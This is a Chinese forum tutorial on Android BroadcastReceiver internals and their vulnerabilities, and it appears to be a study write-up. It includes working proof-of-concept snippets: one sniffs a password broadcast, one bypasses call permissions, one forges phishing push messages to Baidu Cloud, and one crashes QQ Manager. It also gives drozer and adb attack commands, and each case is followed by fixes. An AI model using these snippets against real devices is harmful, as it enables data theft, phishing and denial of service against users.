> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-269309.htm)

> [原创]Android APP 漏洞之战（3）——Broadcast Recevier 漏洞详解

Android APP 漏洞之战（3）——Broadcast Recevier 漏洞详解
============================================

目录

*   Android APP 漏洞之战（3）——Broadcast Recevier 漏洞详解
*            [一、前言](#一、前言)
*            二、Broadcast Recevier 初步介绍
*                    1.Broadcast Recevier 的基本原理
*                    [（1）广播机制简介](#（1）广播机制简介)
*                    [（2）广播机制应用场景](#（2）广播机制应用场景)
*                    [（3）广播机制模型理解](#（3）广播机制模型理解)
*                    [（4）广播机制的使用流程](#（4）广播机制的使用流程)
*                    2.Broadcast Reciver 漏洞的种类和危害
*            三、Broadcast Reciver 漏洞原理分析和复习
*                    [1. 敏感信息泄漏漏洞](#1.敏感信息泄漏漏洞)
*                            [（1）原理介绍](#（1）原理介绍)
*                            [（2）漏洞复现](#（2）漏洞复现)
*                    [2. 权限绕过漏洞](#2.权限绕过漏洞)
*                            [（1）原理介绍](#（1）原理介绍)
*                            [（2）漏洞复现](#（2）漏洞复现)
*                    [3. 消息伪造](#3.消息伪造)
*                            [（1）漏洞介绍](#（1）漏洞介绍)
*                            [（2）漏洞复现](#（2）漏洞复现)
*                    [4. 拒绝服务](#4.拒绝服务)
*                            [（1）漏洞介绍](#（1）漏洞介绍)
*                            [（2）漏洞复现](#（2）漏洞复现)
*            四、Broadcast Reciver 的安全防护
*            [五、实验总结](#五、实验总结)
*            [六、参考网址](#六、参考网址)

[](#一、前言)一、前言
-------------

今天继续总结 Android APP 漏洞四大组件中 Broadcast Recevier 漏洞挖掘的知识，主要分为两个部分，一部分对 Android 广播机制原理作一个初步的总结，另一部分便是对 Android 广播机制常见的一些漏洞进行总结，主要是介绍一些已存在的典型漏洞，部分知识可以参考前两篇帖子 [Android APP 漏洞之战（2）——Service 漏洞挖掘详解](https://bbs.pediy.com/thread-269255.htm)和 [Android APP 漏洞之战（1）——Activity 漏洞挖掘详解](https://bbs.pediy.com/thread-269211.htm)。

二、Broadcast Recevier 初步介绍
-------------------------

### 1.Broadcast Recevier 的基本原理

### [](#（1）广播机制简介)（1）广播机制简介

```
Android中的每个应用程序都可以对自己感兴趣的广播进行注册，这样该程序只会收到自己所关心的广播内容，这些广播可以是来自系统的，也可能是来自其他程序的。Android提供了一套完整的API,允许应用程序自由地发送和接收广播。
广播机制分为两个方面：广播发送者和广播接收者，一般来说，BroadcastReceiver就是广播接收者。

```

### [](#（2）广播机制应用场景)（2）广播机制应用场景

```
（1）Android内不同组件间的通信（应用/不同应用之间）
（2）多线程通信
（3）与Android系统在特定情况下的通信

```

### [](#（3）广播机制模型理解)（3）广播机制模型理解

Android 的广播机制使用了设计模式中的观察者模式：基于消息的发布 / 订阅事件模型，`从设计模式上讲，广播的发送者和接收者极大程度的**解耦**，使得系统方便集成，容易扩展`。

 

模型中的 3 个基本角色：

```
（1）消息订阅者（广播接收者）
（2）消息发布者（广播发布者）
（3）消息中心（AMS,即Activity Manager Service）

```

模型的具体原理如下图所示：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_MVZXUT6TBSK5KQU.png)

### [](#（4）广播机制的使用流程)（4）广播机制的使用流程

我们先通过一个流程图来具体的理解广播机制的运行原理：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_DKAPK7A6KRHKYMV.png)

 

具体的操作流程：

```
（1）首先开发人员自定义广播接收者BroadcastReceiver，并重写onRecvice()方法，在里面可以实现具体操作，然后到消息中心AMS注册
（2）广播发送者定义并向AMS发送广播
（3）AMS查找符合相应条件（IntentFilter/Permission等）的BroadcastReceiver
（4）AMS将广播发送到上述符合条件的BroadcastReceiver相应的消息循环队列中
（5）BroadcastReceiver通过消息循环执行拿到此广播，回调BroadcastReceiver中的onReceive()方法。

```

我们可以按照流程图具体一步步来实现广播机制：

 

**<1> 自定义广播接收者 BroadcastReceiver：**

```
// 继承BroadcastReceivre类
public class mBroadcastReceiver extends BroadcastReceiver {
 
  // 复写onReceive()方法
  // 接收到广播后，则自动调用该方法
  @Override
  public void onReceive(Context context, Intent intent) {
   //写入接收广播后的操作
    }
}

```

```
操作步骤：
（1）继承BroadcastReceivre基类
（2）必须复写抽象方法onReceive()方法
    广播接收器接收到相应广播后，会自动回调 onReceive() 方法，一般情况下，onReceive方法会涉及 与 其他组件之间的交互，如发送Notification、启动Service等，默认情况下，广播接收器运行在 UI 线程，因此，onReceive()方法不能执行耗时操作，否则将导致ANR

```

**<2> 广播接收者注册：**

 

注册的方式分为两种：静态注册、动态注册

 

**静态注册：**

 

注册方式：

```
在AndroidManifest.xml里通过标签声明 
```

属性说明：

```
 //用于指定此广播接收器将接收的广播类型
//本示例中给出的是用于接收网络状态改变时发出的广播 

```

具体实例：

```
 //用于接收网络状态改变时发出的广播 

```

我们完成静态注册后，当 App 首次启动时，系统会自动实例化 mBroadcastReceiver 类，并注册到系统中

 

**动态注册：**

 

注册方式：

```
动态注册需要在功能代码中进行注册

```

具体实例：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_83XSGG22P4PWG6V.png)

 

具体实现步骤：

```
（1）实例化自定义的广播接收者，我们实现广播的功能，可以继承BroadcastReceiver类，并重写类中的方法
（2）实例化意图过滤器，并设置要过滤的广播类型
（3）使用Context的registerReceiver(BroadcastReceiver,IntentFilter)方法注册广播
（4）在onDestory()方法中通过调用unregisterReceiver()方法来实现取消注册

```

注意事项：

```
注意：动态广播最好在Activity的onResume()注册、onPause()注销
原因：
    1.对于动态广播，有注册就必然得有注销，否则会导致内存泄露
    2.Activity生命周期如下都是成对出现的 onCreate() & onDestory()、onStart() & onStop()、onResume() & onPause()
 
在onResume()注册、onPause()注销是因为onPause()在App死亡前一定会被执行，从而保证广播在App死亡前一定会被注销，从而防止内存泄露。
（1）不在onCreate() & onDestory() 或 onStart() & onStop()注册、注销是因为：当系统因为内存不足（优先级更高的应用需要内存，请看上图红框）要回收Activity占用的资源时，Activity在执行完onPause()方法后就会被销毁，有些生命周期方法onStop()，onDestory()就不会执行。当再回到此Activity时，是从onCreate方法开始执行。
（2）假设我们将广播的注销放在onStop()，onDestory()方法里的话，有可能在Activity被销毁后还未执行onStop()，onDestory()方法，即广播仍还未注销，从而导致内存泄露。
（3）但是，onPause()一定会被执行，从而保证了广播在App死亡前一定会被注销，从而防止内存泄露。

```

**两种注册方式的对比：**

 

![](https://bbs.pediy.com/upload/attach/202109/905443_MXZ8UKX7KMT5VGQ.png)

 

这里我们就完成了广播接收者的基本工作

 

**<3> 广播发送者定义和发送广播：**

 

**广播的发送：**

```
（1）广播 是 用意图（Intent）标识
（2）定义广播的本质 = 定义广播所具备的“意图（Intent）
（3）广播发送 = 广播发送者 将此广播的“意图（Intent）”通过sendBroadcast（）方法发送出去

```

**广播的类型：**

 

第一种分类：

 

广播接收器一般可以分为两种类型：标准广播和有序广播

```
标准广播：一种完全异步执行的广播，广播发出之后，所有的广播接收器都会在同一时刻接收这条广播信息，广播效率比较高，同时是无法截断的。

```

![](https://bbs.pediy.com/upload/attach/202109/905443_F84A6V778QKTDH3.png)

```
有序广播：是一种同步执行的广播，在广播发出之后，同一时刻会有一个广播接收器能收到这条广播消息，当这个广播接收器中逻辑执行完毕后，广播才会继续传递。

```

![](https://bbs.pediy.com/upload/attach/202109/905443_YEJZWFEYH4NUW4W.png)

 

第二种分类：

```
广播的类型主要分为5类：
    （1）普通广播
    （2）系统广播
    （3）有序广播
    （4）粘性广播
    （5）App应用内广播

```

**普通广播：**

 

开发者自身定义 intent 的广播（最常用），发送广播使用如下：

```
Intent intent = new Intent();
//对应BroadcastReceiver中intentFilter的action
intent.setAction("BROADCAST_ACTION");
//发送广播
sendBroadcast(intent);

```

若被注册了的广播接收者中注册时 intentFilter 的 action 与上述匹配，则会接收此广播（即进行回调 onReceive()）, 如下 mBroadcastReceiver 则会接收上述广播

```
 //用于接收网络状态改变时发出的广播 

```

如果发送的广播有对应权限，那么广播接收者也需要对应权限

 

**系统广播：**

 

Android 中内置了多个系统广播：只要涉及到手机的基本操作（如开机、网络状态变化、拍照等），都会发送相应的广播每个广播都有特定的 Intent-Filter(包括具体的 action)，Android 系统广播 action 如下：

```
系统操作    action
监听网络变化    android.net.conn.CONNECTIVITY_CHANGE
关闭或打开飞行模式    Intent.ACTION_AIRPLANE_MODE_CHANGED
充电时或电量发生变化    Intent.ACTION_BATTERY_CHANGED
电池电量低    Intent.ACTION_BATTERY_LOW
电池电量充足（即从电量低变化到饱满时会发出广播    Intent.ACTION_BATTERY_OKAY
系统启动完成后(仅广播一次)    Intent.ACTION_BOOT_COMPLETED
按下照相时的拍照按键(硬件按键)时    Intent.ACTION_CAMERA_BUTTON
屏幕锁屏    Intent.ACTION_CLOSE_SYSTEM_DIALOGS
设备当前设置被改变时(界面语言、设备方向等)    Intent.ACTION_CONFIGURATION_CHANGED
插入耳机时    Intent.ACTION_HEADSET_PLUG
未正确移除SD卡但已取出来时(正确移除方法:设置--SD卡和设备内存--卸载SD卡)    Intent.ACTION_MEDIA_BAD_REMOVAL
插入外部储存装置（如SD卡）    Intent.ACTION_MEDIA_CHECKING
成功安装APK    Intent.ACTION_PACKAGE_ADDED
成功删除APK    Intent.ACTION_PACKAGE_REMOVED
重启设备    Intent.ACTION_REBOOT
屏幕被关闭    Intent.ACTION_SCREEN_OFF
屏幕被打开    Intent.ACTION_SCREEN_ON
关闭系统时    Intent.ACTION_SHUTDOWN
重启设备    Intent.ACTION_REBOOT
注：当使用系统广播是，只需要在注册广播接收者时定义相关的action即可，并不需要手动发送广播，当系统有相关操作时会自动进行系统广播

```

**有序广播：**

 

发送出去的广播被广播接收者按照先后顺序接收 有序是针对广播接收者而言的。广播接收者接收广播的顺序规则（同时面向静态和动态注册的广播接收者）：

```
（1）按照Priority属性值从大-小排序
（2）Priority属性相同者，动态注册的广播优先

```

特点：

```
（1）接收广播按顺序接收
（2）先接收的广播接收者可以对广播进行截断，即后接收的广播接收者不在接收此广播，可以使用abortBroadcast()方法
（3）先接收的广播接收者可以对广播进行修改，那么后接收的广播接收者将接收到被修改后的广播

```

具体使用：有序广播的使用过程与普通广播非常类似，差异仅在于广播的发送方式

```
sendOrderedBroadcast(intent,null); //参数1：接收的Intent 参数2：与权限相关字符串，一般为null

```

**App 应用内广播（Local Broadcast）：本地广播**

 

产生的原因：

```
由于Android中的广播可以跨App直接通信（exported对于有intent-filter情况下默认值为true）
导致可能会出现的问题：
    （1）其他App针对性发出与当前App intent-filter相匹配的广播，由此导致当前App不断接收广播并处理
    （2）其他App注册与当前App一致的intent-filter用于接收广播，获取广播的具体星系，会出现安全性和效率性问题
解决方案：
使用App应用内广播（Local Broadcast）
    (1)App应用内广播壳理解为一种局部广播，广播的发送者和接收者都同属于一个App
    (2)相比于全局广播（普通广播），App应用内广播优势体现在：安全性高和效率高

```

实现步骤：

```
方法1：
将全局广播设置为局部广播
（1）注册广播是将exported属性设置为false，使得非本App内部发出的此广播不被接收
（2）在广播的发送和接收时，增设相应权限permission，用于权限验证
（3）发送广播时指定该广播接收器所在的包名，此广播将只会发送到此包中的App内与之相匹配的有效广播接收器中
通过intent.setPackage(packageName)指定包名
 
方法2：
    使用封装好的LocalBroadcastManager类使用方式上与全局广播几乎相同，只是注册/取消注册广播接收器和发送广播时将参数context变成LocalBroadcastManager的单一实例。
注意：对于LocalBroadcastManager方式发送的应用内广播，只能通过LocalBroadcastManager动态注册，不能静态注册

```

方法 2 的具体实现：

```
//注册应用内广播接收器
//步骤1：实例化BroadcastReceiver子类 & IntentFilter mBroadcastReceiver
mBroadcastReceiver = new mBroadcastReceiver();
IntentFilter intentFilter = new IntentFilter();
 
//步骤2：实例化LocalBroadcastManager的实例
localBroadcastManager = LocalBroadcastManager.getInstance(this);
 
//步骤3：设置接收广播的类型
intentFilter.addAction(android.net.conn.CONNECTIVITY_CHANGE);
 
//步骤4：调用LocalBroadcastManager单一实例的registerReceiver（）方法进行动态注册
localBroadcastManager.registerReceiver(mBroadcastReceiver, intentFilter);
 
//取消注册应用内广播接收器
localBroadcastManager.unregisterReceiver(mBroadcastReceiver);
 
//发送应用内广播
Intent intent = new Intent();
intent.setAction(BROADCAST_ACTION);
localBroadcastManager.sendBroadcast(intent);

```

这里我们就完成了开发人员手动完成部分，就成功实现了 Android 的广播机制，后续就是系统自动完成了

 

最后我们关注一些不同注册方式的广播接收器回调 onReceive() 中的 context 返回值

```
对于静态注册（全局+应用内广播），回调onReceive(context,intent)中的context返回值是：ReceiverRestrictedContext
对于全局广播的动态注册，回调onReceive(context, intent)中的context返回值是：Activity Context；
对于应用内广播的动态注册（LocalBroadcastManager方式），回调onReceive(context, intent)中的context返回值是：Application Context
对于应用内广播的动态注册（非LocalBroadcastManager方式），回调onReceive(context, intent)中的context返回值是：Activity Context

```

### 2.Broadcast Reciver 漏洞的种类和危害

Broadcast Reciver 漏洞大致可以分为：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_PX6UGEV9HMMWTBV.png)

 

Broadcast Reciver 漏洞的危害：

```
BroadcastReceiver是四大组件之一，这个组件涉及：广播发送者和广播接收者，这里的广播实际上指的是intent当发送一个广播是，系统会将发送的广播(intent)与系统中所有注册的符合条件的接IntentFilter进行匹配，匹配成功，则执行相应的onReceive函数
发送广播时，如果处理不当，恶意应用便可以嗅探，拦截广播，致使敏感数据泄露，接收广播时处理不当，便会导致拒绝服务攻击、伪造消息、越权操作等

```

![](https://bbs.pediy.com/upload/attach/202109/905443_EY6TE3UZBAJQMHX.png)

三、Broadcast Reciver 漏洞原理分析和复习
-----------------------------

### 1. 敏感信息泄漏漏洞

#### [](#（1）原理介绍)（1）原理介绍

```
发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。

```

#### [](#（2）漏洞复现)（2）漏洞复现

案例 1：

 

我们发现一个目标程序段代码如下：

```
private void d() {
    Intent v1 = new Intent();
    v1.setAction("com.sample.action.server_running");
    v1.putExtra("local_ip",v0.h);
    v1.putExtra("port",v0.i);
    v1.putExtra("code",v0.g);
    v1.putExtra("connected",v0.s);
    v1.putExtra("pwd_predefined",v0.r);
    if(!TextUtils.isEmpty(v0.t)){
        v1.putExtra("connected_usr",v0.t);
    }
    sendBroadcast(v1);
}

```

通过分析得出，该程序通过 intent 隐式传递，并通过 action 匹配发送一个广播，这样系统内其他程序都可以接收到这个广播，然后在广播接收者中编写接收代码，这样我们可以编写攻击代码获取敏感数据信息

```
public void onReceive(Context context,Intent intent){
    String s = null;
    if(intent.getAction().equals("com.sample.action.server_running")){
        String pwd=intent.getStringExtra("connected");
        s="Airdroid => ["+pwd+"]/"+intent.getExtras();
    }
    Toast.makeTest(context,String.format("%sReceived",s),Toast.LENGTH_SHORT).show();
}

```

我们就可以通过广播获取该程序的密码

 

**修复：**

 

我们尝试采用本地广播的方式，这样程序发出的广播就只能被 app 自身广播接收器接收

```
Intent intent = new Intent("my-sensitive-event");
intent.putExtra("event","this is a test event");
LocalBroadcastManager.getInstance(this).sendBroadcast(intent);

```

案例 2：[Android 操作系统中通过 RSSI 广播暴露敏感数据 （CVE-2018-9581)](https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/)

 

漏洞详情：

```
    Android操作系统会定期在系统范围内广播WiFI强度值（RSSI）,RSSI值表示设备接收到的信号
的相对强度（更高=更强），但与实际物理强度dBm没有直接关系，这是通过两个独立的intents实现的，Android 9之前是android.net.wifi.STATE_CHANGE，其他安卓设备是android.net.wifi.RSSI_CHANGED
    当应用通过WifiManager访问信息时，正常就在应用manifest中请求ACCESS_WIFI_STATE权限。因为WiFi RTT特征是Android 9中新引入的，也是用于位置定位的，需要ACCESS_FINE_LOCATION权限。但监听系统广播时，
在不需要通知用户，不需要其他权限的情况下就可以获取信息
    存在的安全问题：
    （1）RSSI值是通过广播获取的，绕过的正常的权限检查（ACCESS_WIFI_STATE）
    （2）通过广播或WiFimanager获取的RSSI值可以在不需要其他位置权限的情况下进行室内定制

```

攻击代码：

```
public class MainActivity extends Activity {
@Override
public void onCreate(Bundle state) {
    IntentFilter filter = new IntentFilter();       
    filter.addAction(android.net.wifi.STATE_CHANGE);
    filter.addAction(android.net.wifi.RSSI_CHANGED);
    registerReceiver(receiver, filter);
}
 
BroadcastReceiver receiver = new BroadcastReceiver() {
@Override
public void onReceive(Context context, Intent intent) {
    Log.d(intent.toString());
    ….
}
};

```

测试步骤：

```
（1）安装Broadcast Monitor app；
 
（2）将手机设置为飞行模式；
 
（3）进入房间；
 
（4）关掉飞行模式，以触发RSSI广播；
 
（5）从以下广播中获取RSSI值：
    android.net.wifi.RSSI_CHANGE – newRssi value
    android.net.wifi.STATE_CHANGE – networkInfo / RSSI
 
（6）重复步骤3-4。

```

我们可以利用广播接收者获取广播中的敏感信息 RSSI 值

### 2. 权限绕过漏洞

#### [](#（1）原理介绍)（1）原理介绍

```
可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentFilter参数，动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等 
```

#### [](#（2）漏洞复现)（2）漏洞复现

案例 1：[小米 MIUI 漏洞可能导致硬件资源消耗](https://wooyun.x10sec.org/static/bugs/wooyun-2012-09175.html)

 

漏洞详情：

```
MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒，利用这个漏洞，可以导致系统电源迅速消耗

```

漏洞攻击代码：

```
Intent intent = new Intent();
intent.setAction("net.cactii.flash2.TOGGLE_FLASHLIGHT");
sendBroadcast(intent);

```

我们这里就是通过 intent 隐私传递，发送广播，然后匹配小米应用中的 action，这样就可以打开或广播手电筒，从而利用这个漏洞，导致系统电源迅速消耗

 

**修复：**

```
三种方法：
1. 在AndroidManifest.xml中，将TorchService申明为export="false"的；
2. 在AndroidManifest.xml中，申明一个私有权限，级别为signature，并为TorchService申明需要这个权限；
3. 在TorchService的实现代码中，检查Intent的来源是否Stk.apk自身。

```

案例 2：[酷派最安全手机 s6 拨打电话权限绕过](https://wooyun.x10sec.org/static/bugs/wooyun-2014-084520.html)

 

漏洞详情：

```
酷派最安全手机s6拨打电话权限绕过，第三方app可以无需拨打电话权限直接拨打电话

```

攻击代码：

```
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.android.phone","com.android.phone.PhoneGlobals$NotificationBroadcastReceiver"));
intent.setAction("com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION");
intent.setData(Uri.parse("tel:10000"));
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
sendBroadcast(intent);

```

通过 intent 启动外部电话应用，匹配 action，并授权标志位，这样就可以不用获取权限，就可以打电话

 

修复：

```
（1）使用本地广播
（2）对广播的action进行判别

```

案例 3：[酷派最安全手机 s6 程序锁绕过](https://wooyun.x10sec.org/static/bugs/wooyun-2014-084516.html)

 

漏洞详情：

```
程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的

```

漏洞测试：

 

简单测试方法用 adb shell 发送广播，用来解锁

 

![](https://bbs.pediy.com/upload/attach/202109/905443_8YB9MGNEX4AS4MT.png)

 

然后使用命令行

```
adb shell am broadcast -a android.intent.action.PACKAGE_FULLY_REMOVED -d package:com.wumii.android.mimi

```

就可以成功解锁：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_H3PEZ42MEVJBX5Q.png)

 

**修复：**

```
推荐使用呢LocalBroadcastManager类,这个类相较于Context.sendBroadcast(intent)有下面三方面的优势：
1.不用担心敏感数据泄露，通过这种方式发送的广播只能应用内接收。
2.不用担心安全漏洞被利用，因为其他应用无法发送恶意广播给你。
3.它比系统的全局广播更高效。

```

### 3. 消息伪造

#### [](#（1）漏洞介绍)（1）漏洞介绍

```
暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患

```

#### [](#（2）漏洞复现)（2）漏洞复现

案例 1：[百度云盘手机版钓鱼、信息泄露和代码执行高危漏洞三合一](https://wooyun.x10sec.org/static/bugs/wooyun-2013-039801.html)

 

漏洞描述：

```
百度云盘手机版存在高危漏洞，恶意攻击者通过该漏洞可以对手机用户进行钓鱼欺骗，盗取用户隐私文件和信息，以百度云盘APP权限执行任何代码。百度云盘有一个广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码。
存在漏洞的组件是：com.baidu.android.pushservice.action.MESSAGE

```

攻击代码：

```
Intent i = new Intent();
 i.setAction("com.baidu.android.pushservice.action.MESSAGE")；
 Bundle b = new Bundle();
 try {
     JSONObject jsobject = new JSONObject();
//1. phishing
     JSONObject custom_content_js = new JSONObject();
     jsobject.put("title", "百度云盘【漏洞你中奖了！】");
     jsobject.put("description", "");
     //jsobject.put("url", "http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk");
     jsobject.put("url", "http://drops.wooyun.org/webview.html");
     JSONObject customcontent_js = new JSONObject();          
     customcontent_js.put("type", "1");
     customcontent_js.put("msg_type", "resources_push");
     customcontent_js.put("uk", "1");
     customcontent_js.put("shareId", "1");     
     jsobject.put("custom_content", customcontent_js);      
     String cmd  = jsobject.toString();
     b.putByteArray("message", cmd.getBytes("UTF-8"));
 } catch (Exception e) {
     // TODO Auto-generated catch block
     e.printStackTrace();
 }

```

修复：

```
设置为签名验证
android:protectionLevel="signature"
 

```

### 4. 拒绝服务

#### [](#（1）漏洞介绍)（1）漏洞介绍

```
如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。
拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。

```

#### [](#（2）漏洞复现)（2）漏洞复现

案例 1：[QQ 手机管家拒绝服务漏洞](https://wooyun.x10sec.org/static/bugs/wooyun-2013-042755.html)

 

漏洞描述：

```
恶意软件发送一个消息就可以轻松让QQ手机管家拒绝服务，安全防护完全失灵。
com.tencent.qqpimsecure.service.InOutCallReceiver这个广播组件没有对消息进行校验，导致空消息造成null point问题，直接crash.

```

攻击代码：

```
Intent i = new Intent();
ComponentName componetName = new ComponentName(  "com.tencent.qqpimsecure",  "com.tencent.qqpimsecure.service.InOutCallReceiver");        
i.setComponent(componetName);      
sendBroadcast(i);

```

![](https://bbs.pediy.com/upload/attach/202109/905443_7Y3CJBSTADM2BGM.png)

 

案例 2：fourgoats.apk 拒绝服务攻击崩溃

 

我们首先用 drozer 测试可导出组件

```
run app.broadcast.info  -a org.owasp.goatdroid.fourgoats

```

![](https://bbs.pediy.com/upload/attach/202109/905443_2XE9SEJGRQCUMNF.png)

 

我们根据组件的类名找对对应的源码信息，发现需要两个参数 phoneNumber、message：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_XCMZJX9FR3PR9PJ.png)

 

我们发送恶意广播:

```
run app.broadcast.send --action 广播名 --extra string name lisi

```

在此之前，我们在 AndroidManifest.xml 文件里面获取广播名：

 

![](https://bbs.pediy.com/upload/attach/202109/905443_FTZR27MCP3NSBM8.png)

 

我们发送恶意广播：

```
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message dog

```

可以发现我们恶意广播发送成功

 

![](https://bbs.pediy.com/upload/attach/202109/905443_B6KSTA4QPWN8HDW.png)

 

![](https://bbs.pediy.com/upload/attach/202109/905443_HMA7KHSPECKKXNY.png)

 

我们再向广播组件发送不完整 intent，使用空 extras，可以看到应用停止运行：

```
run app.broadcast.send --action 
```

![](https://bbs.pediy.com/upload/attach/202109/905443_C6E78USX565KHC5.png)

 

我们就成功完成一次拒绝服务攻击

 

修复：

```
空指针异常
类型转换异常
数组越界访问异常
类未定义异常
其他异常
 
//Serializable：
Intent i = this.getIntent();
if(i.getAction().equals(“serializable_action”)){
 
  i.getSerializableExtra("serializable_key");//未做异常判断
}
//Parcelable:
this.b=(RouterConfig)this.getIntent().getParcelableExtra(“filed_router_config”);//引发转型异常崩溃
 
谨慎处理接收的intent以及其携带的信息。
对接收到的任何数据做try catch处理，以及对不符合预期的数据做异常处理。

```

拒绝服务攻击可以参考 Activity 的拒绝服务攻击和 Service 的拒绝服务攻击

四、Broadcast Reciver 的安全防护
-------------------------

```
（1）私有广播接收器设置exported=’false’,并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。
（2）对接收来的广播进行验证。
（3）内部app之间的广播使用protectionLevel=’signature’ 验证其是否真是内部app。
（4）返回结果时需注意接收app是否会泄露信息。
（5）发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。
（6）使用LocalBroadcastManager。

```

[](#五、实验总结)五、实验总结
-----------------

本文主要介绍了 Android 中广播机制的运行原理，并对 Android 广播机制中的常见漏洞做了一个初步的总结，我们可以发现 Android 的四大组件的漏洞原理基本存在很大的相关性，在拒绝服务攻击中，这里用了一个简易的样本，并逐步实现了拒绝服务攻击的步骤，本文可能还存在很多不足，后续逐步完善，也欢迎各位大佬指正。

[](#六、参考网址)六、参考网址
-----------------

```
Android第一行代码
https://www.jianshu.com/p/ca3d87a4cdf3
https://blog.csdn.net/q376794191/article/details/85292952
https://www.cnblogs.com/lwbqqyumidi/p/4168017.html
https://www.jianshu.com/p/c1a826a5beea
https://www.jianshu.com/p/e236a2669797
https://www.jianshu.com/p/e236a2669797
https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/
https://tea9.xyz/post/962818054.html
https://paper.seebug.org/papers/Archive/drops2/Android%20Broadcast%20Security.html

```

[【公告】 讲师招募 | 全新 “预付费” 模式，不想来试试吗？](https://bbs.pediy.com/thread-271621.htm)

[#基础理论](forum-161-1-117.htm) [#漏洞相关](forum-161-1-123.htm) [#程序开发](forum-161-1-124.htm) [#其他](forum-161-1-129.htm)

上传的附件：

*   [FourGoats.apk](javascript:void(0)) （1.20MB，15 次下载）